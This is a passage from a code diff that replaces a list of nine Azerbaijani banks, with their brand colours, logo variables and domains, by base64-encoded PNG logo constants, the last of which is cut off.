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";
 
-  const banks = [
-    { name: 'Kapital Bank', color: '#E31E24', logo: kapitalLogo, sub: 'kapitalbank.az' },
-    { name: 'Leobank', color: '#0066B3', logo: leoLogo, sub: 'leobank.az' },
-    { name: 'ABB', color: '#004B87', logo: abbLogo, sub: 'abb-bank.az' },
-    { name: 'PAŞA Bank', color: '#E31E24', logo: pashaLogo, sub: 'pashabank.az' },
-    { name: 'AccessBank', color: '#0057A0', logo: accessLogo, sub: 'accessbank.az' },
-    { name: 'Unibank', color: '#004B87', logo: unibankLogo, sub: 'unibank.az' },
-    { name: 'Bank Respublika', color: '#E31E24', logo: respublikaLogo, sub: 'bankrespublika.az' },
-    { name: 'Xalq Bank', color: '#004B87', logo: xalqLogo, sub: 'xalqbank.az' },
-    { name: 'Rabitəbank', color: '#003366', logo: rabitaLogo, sub: 'rabitabank.com' }
-  ];
+// AccessBank
+const accessLogo = "data:image/png;base64,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